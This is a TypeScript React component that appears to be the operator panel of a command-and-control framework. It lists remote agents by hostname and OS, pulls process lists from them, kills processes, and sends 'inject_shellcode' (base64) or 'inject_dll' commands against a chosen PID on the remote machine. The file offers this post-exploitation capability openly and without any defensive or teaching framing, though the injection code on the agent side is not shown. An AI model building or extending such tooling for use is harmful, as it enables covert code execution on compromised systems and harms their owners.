import { useState, useEffect } from 'react'
import axios from 'axios'

interface Agent {
  agent_id: string
  hostname: string
  os: string
  status: string
}

interface ProcessEntry {
  pid: number
  name: string
  cpu: string
  memory: string
  status: string
}

const ProcessManager = () => {
  const [agents, setAgents] = useState<Agent[]>([])
  const [selectedAgent, setSelectedAgent] = useState('')
  const [processes, setProcesses] = useState<ProcessEntry[]>([])
  const [loading, setLoading] = useState(false)
  const [filter, setFilter] = useState('')
  const [killPid, setKillPid] = useState('')
  const [injectPid, setInjectPid] = useState('')
  const [injectType, setInjectType] = useState<'shellcode' | 'dll'>('shellcode')
  const [injectPayload, setInjectPayload] = useState('')
  const [result, setResult] = useState('')
  const [error, setError] = useState('')

  useEffect(() => {
    fetchAgents()
  }, [])

  const fetchAgents = async () => {
    try {
      const res = await axios.get('/api/live/agents')
      const data = res.data
      const list = Object.entries(data).map(([id, info]: [string, any]) => ({
        agent_id: id,
        hostname: info.hostname || 'Unknown',
        os: info.os || 'Unknown',
        status: info.status || 'active',
      }))
      setAgents(list)
      if (list.length > 0 && !selectedAgent) setSelectedAgent(list[0].agent_id)
    } catch { /* ignore */ }
  }

  const sendCommand = async (cmd: any): Promise<string> => {
    const res = await axios.post(`/api/live/agents/${selectedAgent}/command`, cmd)
    const cmdId = res.data?.cmd_id
    if (!cmdId) return ''
    // Poll for result
    for (let i = 0; i < 30; i++) {
      await new Promise(r => setTimeout(r, 1000))
      const poll = await axios.get(`/api/live/agents/${selectedAgent}/result/${cmdId}`)
      if (poll.data?.status && poll.data.status !== 'pending') {
        if (poll.data.status === 'error') throw new Error(poll.data.error || 'Command failed')
        return poll.data.output || ''
      }
    }
    throw new Error('Command timed out')
  }

  const fetchProcesses = async () => {
    if (!selectedAgent) return
    setLoading(true)
    setError('')
    try {
      const output = await sendCommand({ type: 'process_list' })
      // Parse the process list output
      const lines = output.split('\n').filter((l: string) => l.trim())
      const procs: ProcessEntry[] = []
      for (const line of lines) {
        // Expected format: "PID: 1234 | Name: explorer.exe | CPU: 0.5% | Memory: 50MB | Status: running"
        const pidMatch = line.match(/PID:\s*(\d+)/)
        const nameMatch = line.match(/Name:\s*([^|]+)/)
        const cpuMatch = line.match(/CPU:\s*([^|]+)/)
        const memMatch = line.match(/Memory:\s*([^|]+)/)
        const statMatch = line.match(/Status:\s*(.+)/)
        if (pidMatch && nameMatch) {
          procs.push({
            pid: parseInt(pidMatch[1]),
            name: nameMatch[1].trim(),
            cpu: cpuMatch ? cpuMatch[1].trim() : '0%',
            memory: memMatch ? memMatch[1].trim() : '0MB',
            status: statMatch ? statMatch[1].trim() : 'unknown',
          })
        }
      }
      setProcesses(procs)
    } catch (e: any) {
      setError(e.message)
    }
    setLoading(false)
  }

  const handleKill = async () => {
    if (!killPid || !selectedAgent) return
    setError('')
    setResult('')
    try {
      const output = await sendCommand({ type: 'kill_process', pid: parseInt(killPid) })
      setResult(output)
      setKillPid('')
      fetchProcesses()
    } catch (e: any) {
      setError(e.message)
    }
  }

  const handleInject = async () => {
    if (!injectPid || !injectPayload || !selectedAgent) return
    setError('')
    setResult('')
    try {
      let cmd: any
      if (injectType === 'shellcode') {
        cmd = { type: 'inject_shellcode', pid: parseInt(injectPid), shellcode_b64: injectPayload }
      } else {
        cmd = { type: 'inject_dll', pid: parseInt(injectPid), dll_path: injectPayload }
      }
      const output = await sendCommand(cmd)
      setResult(output)
    } catch (e: any) {
      setError(e.message)
    }
  }

  const filtered = processes.filter(p =>
    p.name.toLowerCase().includes(filter.toLowerCase()) ||
    p.pid.toString().includes(filter)
  )

  return (
    <div className="space-y-6">
      <div className="flex items-center justify-between">
        <h1 className="text-2xl font-bold text-white">Process Manager</h1>
        <div className="flex gap-3">
          <select
            value={selectedAgent}
            onChange={e => setSelectedAgent(e.target.value)}
            className="bg-gray-800 text-white border border-gray-600 rounded px-3 py-2"
          >
            {agents.map(a => (
              <option key={a.agent_id} value={a.agent_id}>
                {a.hostname} ({a.os})
              </option>
            ))}
          </select>
          <button
            onClick={fetchProcesses}
            disabled={loading || !selectedAgent}
            className="bg-blue-600 hover:bg-blue-700 text-white px-4 py-2 rounded disabled:opacity-50"
          >
            {loading ? 'Loading...' : 'Refresh'}
          </button>
        </div>
      </div>

      {error && <div className="bg-red-900/30 border border-red-700 text-red-400 p-3 rounded">{error}</div>}
      {result && <div className="bg-green-900/30 border border-green-700 text-green-400 p-3 rounded">{result}</div>}

      {/* Actions Row */}
      <div className="grid grid-cols-2 gap-4">
        {/* Kill Process */}
        <div className="bg-gray-800 p-4 rounded-lg border border-gray-700">
          <h3 className="text-red-400 font-semibold mb-3">Kill Process</h3>
          <div className="flex gap-2">
            <input
              type="text"
              placeholder="PID"
              value={killPid}
              onChange={e => setKillPid(e.target.value)}
              className="flex-1 bg-gray-900 text-white border border-gray-600 rounded px-3 py-2"
            />
            <button
              onClick={handleKill}
              className="bg-red-600 hover:bg-red-700 text-white px-4 py-2 rounded"
            >
              Kill
            </button>
          </div>
        </div>

        {/* Process Injection */}
        <div className="bg-gray-800 p-4 rounded-lg border border-gray-700">
          <h3 className="text-yellow-400 font-semibold mb-3">Process Injection</h3>
          <div className="space-y-2">
            <div className="flex gap-2">
              <input
                type="text"
                placeholder="Target PID"
                value={injectPid}
                onChange={e => setInjectPid(e.target.value)}
                className="w-28 bg-gray-900 text-white border border-gray-600 rounded px-3 py-2"
              />
              <select
                value={injectType}
                onChange={e => setInjectType(e.target.value as any)}
                className="bg-gray-900 text-white border border-gray-600 rounded px-3 py-2"
              >
                <option value="shellcode">Shellcode (Base64)</option>
                <option value="dll">DLL Path</option>
              </select>
            </div>
            <div className="flex gap-2">
              <input
                type="text"
                placeholder={injectType === 'shellcode' ? 'Base64 shellcode...' : 'C:\\path\\to\\payload.dll'}
                value={injectPayload}
                onChange={e => setInjectPayload(e.target.value)}
                className="flex-1 bg-gray-900 text-white border border-gray-600 rounded px-3 py-2"
              />
              <button
                onClick={handleInject}
                className="bg-yellow-600 hover:bg-yellow-700 text-white px-4 py-2 rounded"
              >
                Inject
              </button>
            </div>
          </div>
        </div>
      </div>

      {/* Process List */}
      <div className="bg-gray-800 rounded-lg border border-gray-700">
        <div className="p-4 border-b border-gray-700 flex items-center justify-between">
          <h3 className="text-white font-semibold">Running Processes ({filtered.length})</h3>
          <input
            type="text"
            placeholder="Filter by name or PID..."
            value={filter}
            onChange={e => setFilter(e.target.value)}
            className="bg-gray-900 text-white border border-gray-600 rounded px-3 py-2 w-64"
          />
        </div>
        <div className="overflow-auto max-h-[500px]">
          <table className="w-full text-sm">
            <thead className="bg-gray-900 sticky top-0">
              <tr className="text-gray-400">
                <th className="text-left p-3">PID</th>
                <th className="text-left p-3">Name</th>
                <th className="text-left p-3">CPU</th>
                <th className="text-left p-3">Memory</th>
                <th className="text-left p-3">Status</th>
                <th className="text-left p-3">Actions</th>
              </tr>
            </thead>
            <tbody>
              {filtered.map(p => (
                <tr key={p.pid} className="border-t border-gray-700 hover:bg-gray-700/50">
                  <td className="p-3 text-blue-400 font-mono">{p.pid}</td>
                  <td className="p-3 text-white">{p.name}</td>
                  <td className="p-3 text-gray-300">{p.cpu}</td>
                  <td className="p-3 text-gray-300">{p.memory}</td>
                  <td className="p-3">
                    <span className="px-2 py-1 rounded text-xs bg-green-900/50 text-green-400">
                      {p.status}
                    </span>
                  </td>
                  <td className="p-3">
                    <button
                      onClick={() => setKillPid(p.pid.toString())}
                      className="text-red-400 hover:text-red-300 text-xs"
                    >
                      Kill
                    </button>
                    <span className="mx-2 text-gray-600">|</span>
                    <button
                      onClick={() => setInjectPid(p.pid.toString())}
                      className="text-yellow-400 hover:text-yellow-300 text-xs"
                    >
                      Inject
                    </button>
                  </td>
                </tr>
              ))}
              {filtered.length === 0 && (
                <tr>
                  <td colSpan={6} className="p-8 text-center text-gray-500">
                    {processes.length === 0 ? 'Click Refresh to load processes' : 'No matching processes'}
                  </td>
                </tr>
              )}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  )
}

export default ProcessManager
